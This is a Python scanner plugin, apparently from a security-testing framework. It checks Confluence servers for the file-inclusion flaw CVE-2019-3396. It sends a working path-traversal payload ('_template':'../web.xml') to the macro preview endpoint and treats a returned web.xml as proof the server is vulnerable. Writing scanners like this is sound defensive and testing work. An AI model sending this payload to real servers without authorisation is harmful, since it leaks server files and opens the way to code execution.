import os,sys
import re
sys.path.append("../")
from lib.core import *

query = ""

class scannerclass(coreclass):
    name = "Confluence企业知识管理与协同软件任意文件包含漏洞（CVE-2019-3396）"
    author = "BaCde"
    description = "Confluence任意文件包含漏洞，可以利用该漏洞读取服务器上任意文件，或者执行恶意代码。漏洞编号CVE-2019-3396。影响版本：6.6.12之前所有6.6.x版本，6.12.3之前所有6.12.x版本，6.13.13之前所有6.13.x版本，6.14.2之前所有6.14.x版本。"
    product = "homepage"
    homepage = ""
    Reference = ""
    vulid = ""
    pubdate = "2020.02.12"

    def __init__(self,target):
        coreclass.__init__(self,target)

    def scanner(self):
        payloads = ["/rest/tinymce/1/macro/preview"]
        self.setheader("Content-Type","application/json; charset=utf-8")
        self.setheader("User-Agent","Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0")
        data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}'
        for payload in payloads:
            url = self.url + payload
            try:
                r = self.post(url,self.headers,data,timeout=3)
                if r:
                    content = r.content.decode()
                    if self.matchexp(":",'</web-app>',content) :
                        ret = url
                        #print(url)
            except Exception as e:
                print(e)
        ret = self.output(payload,ret)
        return ret
if __name__ == "__main__":
    p = scannerclass("http://127.0.0.1:8080/")
    print(p.scanner())
    
    